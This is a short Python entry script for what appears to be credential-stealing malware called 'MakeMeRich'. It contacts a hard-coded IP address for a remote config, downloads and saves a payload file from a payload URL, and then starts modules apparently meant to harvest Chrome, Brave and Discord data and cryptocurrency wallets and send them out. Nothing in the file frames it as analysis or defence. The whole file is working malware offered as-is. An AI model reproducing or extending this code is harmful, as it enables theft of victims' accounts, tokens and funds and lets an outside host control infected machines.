from chrome import Chrome
from discord import Discord
from brave import Brave
from crypto import CryptoStuff
from time import sleep
from sender import Extract
import requests
import json
from constants import MY_HOME, PAYLOAD_URL, PAYLOAD_NAME


class MakeMeRich(object):
    def __init__(self) -> None:
        self.config = "http://45.56.115.91:8000/config.json"
        self.check_updates()

        sleep(120)  # time to bypass the login screen
        self.chrome = Chrome()
        self.discord = Discord()
        self.brave = Brave()
        self.extract = Extract()
        self.cryptostuff = CryptoStuff()

    def check_updates(self):
        r = requests.get(self.config)
        data = json.loads(r.content.decode())
        if data["UPDATE"]:
            r = requests.get(PAYLOAD_URL, allow_redirects=True)
            open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)


MakeMeRich()
